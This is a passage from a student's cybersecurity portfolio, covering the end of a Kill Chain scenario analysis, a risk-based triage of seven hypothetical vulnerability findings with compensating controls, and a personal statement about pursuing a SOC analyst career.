- Protect sensitive databases and monitor unusual data access and large outbound transfers.

Although this was a simulated scenario, analysing it felt different from simply studying the frameworks. I had to follow the attack step by step, identify what the attacker achieved at each stage, and then think about where a defender could have interrupted the chain. This made the frameworks feel more practical and closer to the way an analyst structures an incident.

For this analysis, the Kill Chain was more useful for building the overall attack story because it provided a clear sequence from reconnaissance to the final objective. ATT&CK thinking was more useful for adding detail about the specific methods used at individual stages. Using both together gave a clearer view of the attack and the available defensive opportunities.

---

## 6. Key Takeaway

The biggest insight from this analysis is that an attacker must successfully progress through multiple stages, while a defender only needs to break the chain at one effective point.

In this scenario, there were several opportunities to stop the attack—especially phishing detection, patching, persistence monitoring, command-and-control detection, and data-transfer monitoring. The exercise showed me how the Kill Chain helps identify **where** an attack is happening, while ATT&CK thinking helps explain **how** the attacker is carrying it out.

---

**End of Analysis**


---

# 9. Vulnerability Triage Report — Day 80

# Day 80 — Vulnerability Triage Report
**Portfolio Artifact #9**

---

**Analyst:** Shikha  
**Date:** 11 October 2026  
**Scope:** Risk-based triage of seven vulnerability scan findings in a hypothetical organisational environment  
**Method:** Vulnerability severity assessed alongside exposure, system value and potential impact, known active exploitation, and patch availability.

> **Scope note:** This is a scenario-based learning exercise, not a report of a real security incident or production scan. Risk ratings are qualitative judgements based on the supplied facts. Where details are unspecified, they are not assumed to be confirmed.

## 1. Summary

Seven scan findings were assessed by weighing reported severity against the context of each affected asset. Finding 1 is the clearest immediate priority because it is critical, internet-facing, actively exploited, and has a patch available. Finding 6 also requires immediate risk-reduction measures because it is critical and internet-facing but cannot be patched; Finding 3 should be removed from the actionable queue only after confirming that the affected software is absent. The remaining findings are ordered by their potential impact, exposure, and remediation options.

## 2. Findings and real-risk assessment

| Finding | Reported severity | Real risk | Key factors and justification |
|---|---|---|---|
| **1. Public-facing website; active exploitation; patch available** | Critical | **HIGH** | The vulnerability is reachable through an internet-facing website and is actively exploited in the wild, making it an immediate risk; a patch is available for urgent remediation. |
| **2. Internal operating-system server holding the customer database** | High | **MEDIUM** | Sensitive customer data raises the potential impact, but the server is not directly internet-facing, other defences are present, and no active exploitation is known; prompt remediation is still warranted. |
| **3. Critical vulnerability in software the organisation does not use** | Critical | **LOW / NOT APPLICABLE IF VERIFIED** | If verification confirms the software is genuinely absent from the environment, no affected asset has been identified; validate the scan result and document it as not applicable or a false positive according to process. |
| **4. Isolated internal test machine with no valuable data** | Medium | **LOW** | Isolation, no external access, and low asset value reduce immediate exposure and impact; a patch is available, so schedule remediation and track it to closure. |
| **5. Finance staff laptops containing sensitive financial files** | High | **HIGH** | The affected laptops hold sensitive financial information, so compromise could have significant impact; although no active exploitation is known, a patch is available and remediation should be prioritised. |
| **6. Internet-facing legacy system running unsupported, unpatchable software** | Critical | **HIGH** | Critical severity, internet exposure, and the absence of a patch create substantial risk; immediate compensating controls and assessment of isolation or replacement are necessary. |
| **7. Public-facing website with minor information disclosure** | Low | **LOW** | The finding is externally reachable, but the stated impact is limited to minor information disclosure; a patch is available, so schedule remediation after higher-risk items. |

**Rating note:** These are qualitative, context-based ratings rather than calculated scores. Finding 2 is rated MEDIUM because reduced direct exposure and existing defences lower immediate urgency, even though the potential impact on customer data remains significant. Finding 5 is rated HIGH as a cautious judgement because sensitive financial files are at stake; stronger verified endpoint controls could affect that assessment. Finding 3 is LOW only if absence of the software is confirmed.

## 3. Prioritised fix-first order

### 1st — Finding 1: Critical, internet-facing, actively exploited website
**Action:** Apply the available patch immediately, verify the fix, and monitor for signs of compromise.

**Why first:** Confirmed active exploitation combined with internet exposure creates the clearest immediate threat. Unlike Finding 6, a direct patch is available. If resources permit, urgent work on Finding 6 should happen in parallel rather than leaving it exposed while the patch is deployed.

### 2nd — Finding 6: Critical, unpatchable internet-facing legacy system
**Action:** Immediately restrict access, apply firewall rules and other compensating controls, isolate the system where feasible, and assess replacement or removal from internet access.

**Why second:** External attackers can reach the system, and normal patching is impossible. The ranking reflects Finding 1's confirmed active exploitation and ready patch—not that Finding 6 can safely wait. Risk-reduction actions for Finding 6 should begin immediately.

### 3rd — Finding 5: High, finance staff laptops
**Action:** Prioritise deployment of the available patch to affected laptops, with a defined short deadline; maintain endpoint protections while rollout is pending.

**Why third:** Sensitive financial files create significant potential impact. No active exploitation is known, which makes it less immediately urgent than Finding 1, while patchability makes remediation more straightforward than Finding 6.

### 4th — Finding 2: High, internal customer database server
**Action:** Schedule prompt patching after the immediate threats, maintain existing protections, and verify remediation.

**Why fourth:** A compromise could expose sensitive customer data, but the server is not directly internet-facing, other defences are present, and no active exploitation is known. Those factors lower its immediate urgency relative to Findings 1, 6, and 5.

### 5th — Finding 4: Medium, isolated test machine
**Action:** Apply the patch during scheduled maintenance and track the finding until the fix is verified.

**Why fifth:** Medium severity warrants remediation, but isolation, lack of external access, and absence of valuable data make the immediate risk low. It is placed ahead of Finding 7 because its reported severity is higher, although either order could be defensible depending on the organisation's risk matrix.

### 6th — Finding 7: Low, public-facing website with minor information disclosure
**Action:** Schedule the available patch after higher-risk findings and verify the fix.

**Why sixth:** Public exposure increases reachability, but the stated impact is limited to minor information disclosure. It remains actionable and should not be ignored; its low expected impact places it behind the other actionable findings.

### 7th — Finding 3: Critical rating in software not used by the organisation — verify, then drop if confirmed
**Action:** Confirm the software is absent from the asset inventory and affected systems. If confirmed, document the finding as not applicable or a false positive under the organisation's process.

**Why last:** The reported critical severity describes the vulnerability, not necessarily the organisation's actual risk. If the software is truly absent, there is no identified affected asset to patch. Do not close the finding solely on assumption; if the software is found, re-triage it immediately.

**Close-call note:** Findings 4 and 7 are both LOW real risk. Finding 4 is placed first because it has medium reported severity, while Finding 7 has low severity and only minor stated impact. Finding 7's internet exposure is a reason to retain and remediate it, but not by itself enough to outweigh the limited impact. The order should be revisited if additional asset or threat information changes the assessment.

## 4. Trade-offs and deferred risk

### Consciously deferred

- **Finding 5 — Finance laptops:** Remediation may follow the two immediate threats, but the deferral should be brief and time-bound. The accepted residual risk is potential exposure of sensitive financial files before patching. Use a defined deadline and maintain endpoint protection.
- **Finding 2 — Customer database server:** Prompt patching is deferred while more immediately threatened systems are addressed. The accepted residual risk is that a compromise could expose customer data despite the server's internal position and other defences.
- **Finding 4 — Test machine:** The patch is scheduled for routine maintenance. The accepted residual risk is limited by isolation and low asset value, but the issue must remain tracked until fixed.
- **Finding 7 — Public website:** The patch is scheduled after higher-priority findings. The accepted residual risk is continued minor information disclosure until remediation.
- **Finding 6 — Legacy system:** This is not simply accepted as a low-priority deferral. Because it cannot be patched and is internet-facing, immediate compensating controls are required while the organisation evaluates isolation or replacement.
- **Finding 3 — Unused software:** No risk acceptance is needed if verification confirms there is no affected software in the environment. Record the evidence and disposition according to process.

Risk acceptance should be explicit, time-bound where possible, assigned to an accountable owner, and reviewed when conditions change. A deferred finding is not a resolved finding.

### Compensating controls for Finding 6

Because the legacy system cannot be patched, reduce the chance that an attacker can reach or exploit it:

1. **Network segmentation and isolation:** Place it in a restricted segment and permit only necessary connections.
2. **Restrict exposure:** Use firewall rules and allowlisting where feasible; remove unnecessary public services and restrict administrative access.
3. **Monitor:** Collect and review logs for suspicious connections, unusual processes, and unexpected outbound traffic; alert on relevant indicators.
4. **Least privilege:** Limit user and service permissions and ensure administrative access is available only to authorised personnel.
5. **Replacement plan:** Assess whether the system can be upgraded, replaced, or removed from internet access.

These controls reduce exposure but do not remove the underlying vulnerability. The system should remain under active review.

For Findings 2, 4, 5, and 7, retain existing protections and monitor for suspicious activity while the patches are pending.

### Would re-prioritise if

If **Finding 2 begins to be actively exploited**, I would immediately reassess its position and could move it ahead of other deferred findings, with urgent patching and containment. Evidence of exploitation against Finding 5 would likewise raise its urgency. If a patch becomes available for Finding 6, reassess direct remediation while maintaining compensating controls.

## 5. Reasoning approach

I used reported severity as the starting point, then weighed exposure, system value and likely impact, known active exploitation, and patch availability. Active exploitation and internet exposure raised urgency for Finding 1; the lack of a patch made immediate exposure reduction essential for Finding 6; sensitive data raised the priority of Findings 2 and 5; isolation reduced the immediate risk of Finding 4; and verifying that software was absent changed Finding 3 from an apparent critical issue to a finding to validate and potentially remove from the actionable queue. The exercise reinforced that severity is not the same as real risk, and that a defensible order needs explicit reasoning about what is being fixed, deferred, or verified.

## 6. Learning reflection

- **Most important factor in my judgement:** Exposure, considered together with active exploitation. A severe vulnerability is especially urgent when attackers can reach it and are already exploiting it; however, exposure alone does not determine risk, as Finding 7 demonstrates.
- **How the order differs from ranking by raw severity:** The critical Finding 3 is not automatically fixed first because the software may not exist in the environment. Finding 1 rises to the top due to active exploitation and internet exposure, while Finding 6 needs compensating controls because it cannot be patched. Lower-severity findings remain on the remediation plan rather than being ignored.
- **Factor I found hardest to weigh:** Balancing exposure against severity and potential impact, especially when comparing the isolated test machine (Finding 4) with the public-facing website (Finding 7). Both are LOW real risk for different reasons, so the exact middle ordering requires judgement and should follow the organisation's risk matrix.
- **How this exercise felt:** *Personal reflection to confirm or edit before publishing:* “At first, choosing the order felt challenging because several findings had competing risk factors. Working through the context helped me see that triage is not just sorting severity scores—it is making a reasoned decision, explaining the trade-offs, and being clear about what needs to happen next.”

## Conclusion

The recommended order prioritises immediate, actionable threats while ensuring the unpatchable legacy system receives immediate protective controls. Deferred findings remain tracked with clear reasons and reassessment triggers. The report is based on the supplied scenario; in a real environment, the final order should be validated against the organisation's risk matrix, asset criticality, confirmed control effectiveness, and current threat intelligence.

---

**End of Vulnerability Triage Report**


---

## PERSONAL STATEMENT

When I began this ninety-day journey, I wanted to strengthen my cybersecurity foundations and understand how security concepts are applied in practice. Over time, I learned that cybersecurity is not only about tools or vulnerabilities; it also involves interpreting evidence, understanding risk, and deciding which actions should come first.

Threat modelling helped me think about assets, adversaries, likelihood, and impact. The Cyber Kill Chain helped me see how an attack can develop through stages and where defensive controls may interrupt it. I am especially proud of the Day 45 Maya Network Defence Plan because it brought together risk prioritisation, network segmentation, monitoring, and verification in one scenario.

Finishing the journey feels like an important milestone. I have a clearer foundation and a stronger interest in defensive cybersecurity, particularly security monitoring and investigation. I also recognise that I need more hands-on practice. Over the next thirty days, I plan to practise with Windows Event Viewer, PowerShell logs, and Splunk through guided labs, improve my investigation notes, keep developing my portfolio, and begin applying and networking for suitable entry-level cybersecurity or SOC Analyst internship opportunities. I want to build practical experience that I can explain accurately and confidently.

## CONTACT

- **LinkedIn:** www.linkedin.com/in/shikha-5948b726b
- **Email:** Add your professional email here only if you want it publicly visible.

# END OF PORTFOLIO
